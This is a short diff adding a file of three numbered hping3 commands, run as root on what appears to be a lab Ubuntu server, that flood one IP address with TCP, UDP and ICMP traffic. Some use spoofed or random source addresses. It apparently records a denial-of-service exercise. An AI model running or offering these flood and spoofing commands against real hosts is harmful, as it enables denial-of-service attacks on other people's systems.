@@ -1,0 +1,12 @@
+1)
+root@ljingGBC-lamp-ubuntu:~# hping3 -c 10000 --rand-source 178.128.237.247
+
+
+
+2)
+root@ljingGBC-lamp-ubuntu:~# hping3 --udp -a 190.0.175.100 -c 9000 --faster 178.128.237.247
+
+
+
+3)
+root@ljingGBC-lamp-ubuntu:~# hping3 --icmp -c 11000 -d 1024 -i u13333 178.128.237.247
